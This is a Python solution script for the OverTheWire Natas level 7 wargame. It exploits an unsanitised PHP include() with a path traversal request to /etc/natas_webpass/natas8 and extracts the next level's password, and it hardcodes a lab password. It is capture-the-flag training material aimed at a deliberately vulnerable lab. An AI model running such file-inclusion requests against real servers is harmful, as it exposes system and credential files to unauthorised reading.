import requests
import bs4
import re


# configuration for natas7
USERNAME = 'natas7'
PASSWORD = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'
URL = 'http://natas7.natas.labs.overthewire.org/'
AUTH = requests.auth.HTTPBasicAuth(USERNAME, PASSWORD)


session = requests.Session()
session.auth = AUTH
response = session.get(URL)
soup = bs4.BeautifulSoup(response.text, 'html.parser')
div_content = soup.find('body').find('div', {'id' : 'content'})
print(f'{div_content}\n')


# as we can see, we can pass parameter 'page' to the website
response = session.get(URL + 'index.php?page=random')
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')
# it seems that whatever we pass to 'page' will be passed to php include() function without any input sanitization
# one attack that we can try is php local file inclusion, where we can access the file that the server has access to


# according to the error, the directory structure is /var/www/natas/natas7/index.php
# to get to /, we need ../../../../
# natas7 > natas > www > var > / 
# and the password, mentioned in the hint for this level, is stored in /etc/natas_webpass/natas8
# therefore, we can use ../../../../etc/natas_webpass/natas8
response = session.get(URL + 'index.php?page=../../../../etc/natas_webpass/natas8')
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')


password = re.search(r'<br/>\n(\w+)\n\n<!--', str(div_content)).group(1)
print(f'natas8 password: {password}')